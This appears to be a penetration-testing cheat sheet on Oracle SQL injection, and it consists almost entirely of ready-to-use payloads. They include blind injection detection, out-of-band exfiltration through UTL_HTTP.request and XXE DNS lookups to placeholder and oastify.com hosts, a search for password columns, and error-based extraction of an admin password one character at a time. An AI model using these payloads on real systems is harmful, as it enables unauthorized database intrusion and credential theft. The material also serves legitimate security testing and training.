---
description: Advanced Oracle SQL Injection Exploitation
---

# Oracle

#### Oracle - Detecting blind on Oracle

Oracle database requires all SELECT statements to explicitly specify a table name.

```sql
#This will trigger an error
'||(SELECT '')||'

#This won't trigger an error
'||(SELECT '' FROM dual)||'

#This will trigger an error
'||(SELECT '' FROM not-a-real-table)||'

#This won't trigger an error if "users" table exists
'||(SELECT '' FROM users WHERE ROWNUM = 1)||'
```

#### Oracle - Extract data via HTTP (OOB) using UTL\_HTTP.rquest

{% code overflow="wrap" %}
```bash
#Hostname:
asd' || UTL_HTTP.request('http://xxx/?host='||(SELECT host_name FROM v$instance))-- -
```
{% endcode %}

{% code overflow="wrap" %}
```bash
#Databases (increment the offset):
' || UTL_HTTP.request('http://xxx/?dbs='||(SELECT DISTINCT owner FROM all_tables OFFSET 0 ROWS FETCH NEXT 1 ROWS ONLY))-- -
```
{% endcode %}

{% code overflow="wrap" %}
```bash
#Tables
' || UTL_HTTP.request('http://xxxx/?tables='||(SELECT table_name FROM all_tables OFFSET 0 ROWS FETCH NEXT 1 ROWS ONLY))-- -
```
{% endcode %}

{% code overflow="wrap" %}
```bash
#Columns
' || UTL_HTTP.request('http://xxx/?columns='||(SELECT column_name FROM all_tab_columns WHERE table_name = 'TABLE_NAME' OFFSET 0 ROWS FETCH NEXT 1 ROWS ONLY))-- -
```
{% endcode %}

#### Oracle - Extract data via DNS lookup (OOB) through XXE

This an Oracle vulnerability that has been patched, but there are many unpatched Oracle installations in existence.

{% code overflow="wrap" %}
```sql
' || (SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://xx.oastify.com/"> %remote;]>'),'/l') FROM dual)-- -

' || (SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='admin')||'.xxx.oastify.com/"> %remote;]>'),'/l') FROM dual)-- -
```
{% endcode %}

#### Oracle - Find tables by column name&#x20;

{% code overflow="wrap" %}
```plsql
SELECT owner, table_name FROM all_tab_columns WHERE column_name LIKE '%PASS%' AND owner != 'SYS';
```
{% endcode %}

#### Oracle blind injection by triggering SQL errors

This type of query is useful when a blind attack is possible and the response does not change when query is true or false, but yes when there is a SQL error (like 1 divided by 0).

This involves modifying the query so that it will cause a database error if the condition is true, but not if the condition is false.

{% code overflow="wrap" %}
```sql
#TRUE (1=1) will trigger a DB error
' AND (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE 'A' END FROM dual)='A
' AND (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE 'A' END FROM dual)='A

#Some error equals true
' AND (SELECT CASE WHEN ((SELECT substr(password,1,1) FROM users WHERE username='admin')='a') THEN TO_CHAR(1/0) ELSE 'A' END FROM dual)='A
```
{% endcode %}
